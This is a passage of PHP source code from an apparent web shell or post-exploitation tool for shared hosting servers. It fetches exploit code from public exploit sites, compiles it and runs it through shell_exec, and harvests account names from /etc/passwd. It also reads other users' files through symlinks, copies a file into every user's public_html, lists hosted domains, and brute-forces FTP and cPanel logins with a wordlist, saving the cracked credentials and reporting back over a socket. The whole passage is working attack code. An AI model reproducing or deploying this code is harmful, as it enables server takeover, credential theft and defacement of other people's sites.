    print("Running exploit..!\n<br>");
    ob_flush();flush();
    @shell_exec("./$withoutc");
    }
    else
    {
    fwrite($socket,"File doesn't compile\n");
    print("File doesn't compile\n<br>");
    ob_flush();flush();
    }
    
    }
    
    }
    fwrite($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    }
    else
    {
    fwrite($socket,"Not found any exploits\n");
    print("Not found any exploits\n<br>");
    ob_flush();flush();
    }
  }
  private function curl($site,$post=null)
  {
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_URL,$site);
  if($post != null)
  {
  curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
  }
  $exec = curl_exec($ch);
  curl_close($ch);
  return $exec;
  }
  private function download($url)
  {
  preg_match('#\/exploits\/(.+)#si',$url,$filename);
  $filename = $filename[1].".c";
  $url    = str_replace("exploits","download",$url);
  $openurl  = @file_get_contents($url);
  if($openurl && file_put_contents($filename,$openurl)){
  return $filename;
  }
  else
  {
  return false;
  }
  
  }
  private function day1337download($url)
  {
  preg_match('#\/exploit\/(.+)#si',$url,$filename);
  $filename = $filename[1].".c";
  $data    = $this->curl($url,"agree=Ok");
  preg_match("#<pre class='brush: plain; tab-size: 8'>(.*?)<\/pre>#si",$data,$content);
  if(file_put_contents($filename,$content))
  {
  return $filename;
  }
  else
  {
  return false;
  }
  
  }
  private function grab_users($socket)
  {
  $read = file("/etc/passwd");
  $x0x  = "";
  foreach($read as $text)
  {
  $text = trim($text);
  $user = explode(":",$text);
  $user = $user[0];
  $xox .= $user."\r\n";
  fwrite($socket,$user."\n");
  print($user."\n");
  }
  fwrite($socket,"Grabbed ".count($read)." users from /etc/passwd\n");
  print("Grabbed ".count($read)." users from /etc/passwd\n");
  $save = $this->save_as("users",$xox,"wb");
  if($save){fwrite($socket,"Saved into file as 'users'\n");print("Saved into file as 'users'\n");}else{fwrite($socket,"Doesn't save into file\n");print("Doesn't save into file\n");}
  }
  private function catln($file,$socket)
  {
  $savefile = uniqid();
  @shell_exec("ln -s $file ".$savefile);
  if(file_exists($savefile))
  {
  fwrite($socket,file_get_contents($savefile));
  print(file_get_contents($savefile));
  fwrite($socket,"File name $savefile\n");
  print("File name $savefile\n");
  }
  else
  {
  fwrite($socket,"File doesn't read\n");
  print("File doesn't read\n");
  }
  
  }
  private function index($file,$socket)
  {
  $etc  = file('/etc/passwd');
  $count= 0;
  foreach($etc as $txt)
  {
  $txt = trim($txt);
  $user= explode(":",$txt);
  $user= $user[0];
  $path= "/home/$user/public_html/$file";
  @shell_exec("cp $file $path");
  if(file_exists($path))
  {
  fwrite($socket,"File created: ".$path."\n");
  print("File created: ".$path."\n");
  $count++;
  }
  
  }
  fwrite($socket,"Completed\n");
  print("Completed\n");
  fwrite($socket,"File copied into $count dirs\n");
  print("File copied into $count dirs\n");
  }
  private function getf($file,$socket)
  {
  $etc   = file('/etc/passwd');
  $count = 0; 
  foreach($etc as $txt)
  {
  $txt = trim($txt);
  $user= explode(":",$txt);
  $user= $user[0];
  $path= "/home/$user/public_html/$file";
  if(file_exists($path))
  {
  fwrite($socket,"File found: ".$path."\n");
  print("File found: ".$path."\n");
  $content = file_get_contents($path);
  if($content)
  {
  $save = $this->save_as($user."-".$file,$content);
  if($save){
  fwrite($socket,"File is readable,saved into file named $user-$file\n");
  print("File is readable,saved into file named $user-$file\n");
  $count++;
  }
  else
  {
  fwrite($socket,"File is readable but current dir is not writable\n");
  print("File is readable but current dir is not writable\n");
  }
  
  }
  else
  {
  @shell_exec("ln -s $path $user-$file");
  if(file_exists($user[0]."-".$file)){
  fwrite($socket,"File is read with ln -s method,saved into file named $user-$file\n");
  print("File is read with ln -s method,saved into file named $user-$file\n");
  $count++;
  }
  else
  {
  fwrite($socket,"File is not readable\n");
  print("File is not readable\n");
  }
  
  }
  
  }
  
  }
  fwrite($socket,"Grabbed $count files\n");
  print("Grabbed $count files\n");
  
  }
  private function domains($socket)
  {
  $x0x   = "";
  $c     = 0;
  $path    = "/var/named";
  $dir_handle = @opendir($path);
  if($dir_handle)
  {
  while ($file = readdir($dir_handle)) 
  {
  if (!is_dir($path."/".$file) AND ($file != "..") AND ($file != ".")) { 
  $dosya = str_replace(".db","",$file);
  fwrite($socket,$dosya."\n");
  print($dosya."\n");
  $x0x .= $dosya."\r\n";
  $c++;
  }

  }
  $save = $this->save_as("d0mains",$x0x,"wb");
  if($save == false){fwrite($socket,"Got domains but can't save into a file this dir is not writable\n");print("Got domains but can't save into a file this dir is not writable\n");}
  else
  {
  fwrite($socket,"Grabbed $c domains\n");
  print("Grabbed $c domains\n");
  fwrite($socket,"Saved into 'd0mains'\n");
  print("Saved into 'd0mains'\n");
  }
  closedir($dir_handle);
  } 
  else
  {
  fwrite($socket,"Doesn't read /var/named\n");
  print("Doesn't read /var/named\n");
  }
  
  }
  private function ftp($wordlist,$socket)
  {
  fwrite($socket,"Starting ftp crack..\n");
  ob_flush();flush();
  $open = file($wordlist);
  $userx= array();
  foreach($open as $pwd)
  {
  $pwd = trim($pwd);
  fwrite($socket,"Password ".$pwd." trying on all users\n");
  ob_flush();flush();
  $users= file('/etc/passwd');
  foreach($users as $user)
  {
  $user = trim($user);
  $user = explode(":",$user);
  $user = $user[0];
  $userx[] = $user;
  }
  $userx = array_filter($userx);
  $userx = array_unique($userx);
  $userx = array_chunk($userx,25);
  $multi = curl_multi_init();
  foreach($userx as $u)
  {
    for($i=0;$i<=count($u)-1;$i++)
    {
    $curl[$i] = curl_init();
    curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl[$i],CURLOPT_URL,"ftp://".$this->server_ip);
    curl_setopt($curl[$i],CURLOPT_USERPWD,trim($u[$i]).":".$pwd);
    curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
    curl_multi_add_handle($multi,$curl[$i]);
    }
    do
    {
    curl_multi_exec($multi,$active);
    usleep(1);
    }while($active>0);
    foreach($curl as $cid => $cend)
    {
    $data[$cid] = curl_multi_getcontent($cend);
    if(preg_match('#drw#si',$data[$cid]))
    {
    fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
    print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
    $save = $this->save_as("ftps.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
    ob_flush();flush();
    }
    else
    {
    fwrite($socket,"Not found $u[$cid]:$pwd\n");
    print("Not found $u[$cid]:$pwd\n");
    ob_flush();flush();
    }
    curl_multi_remove_handle($multi,$cend);
    }
  }
  
  }
  
  }
  private function cpanel($wordlist,$socket)
  {
  fwrite($socket,"Starting cpanel crack..\n");
  ob_flush();flush();
  $open = file($wordlist);
  $userx= array();
  foreach($open as $pwd)
  {
  $pwd = trim($pwd);
  fwrite($socket,"Password ".$pwd." trying on all users\n");
  ob_flush();flush();
  $users= file('/etc/passwd');
  foreach($users as $user)
  {
  $user = trim($user);
  $user = explode(":",$user);
  $user = $user[0];
  $userx[] = $user;
  }
  $userx = array_filter($userx);
  $userx = array_unique($userx);
  $userx = array_chunk($userx,25);
  $multi = curl_multi_init();
  foreach($userx as $u)
  {
    for($i=0;$i<=count($u)-1;$i++)
    {
    $curl[$i] = curl_init();
    curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl[$i],CURLOPT_URL,"https://$this->server_ip:2083/login/?login_only=1");
    curl_setopt($curl[$i],CURLOPT_POSTFIELDS,"user=".trim($u[$i])."&pass=$pwd");
    curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($curl[$i],CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
    curl_multi_add_handle($multi,$curl[$i]);
    }
    do
    {
    curl_multi_exec($multi,$active);
    usleep(1);
    }while($active>0);
    foreach($curl as $cid => $cend)
    {
    $data[$cid] = curl_getinfo($cend);
    if($data[$cid]['http_code'] != 401)
    {
    fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
    print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
    $save = $this->save_as("cpanels.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
    ob_flush();flush();
    }
    else
    {
    fwrite($socket,"Not found $u[$cid]:$pwd\n");
    print("Not found $u[$cid]:$pwd\n");
    ob_flush();flush();
    }
    curl_multi_remove_handle($multi,$cend);
    }
  }
  
  }
  
  }
  private function save_as($filename,$content,$type='ab')
  {
  $fopen = fopen($filename,$type);
  if($fopen)
  {
  fwrite($fopen,$content);
  fclose($fopen);
  return true;
  }
  else
  {
  return false;
  }
  
  }
}
function pr($s)
{
    echo "<pre>" . print_r($s) . '</pre>';
}
;
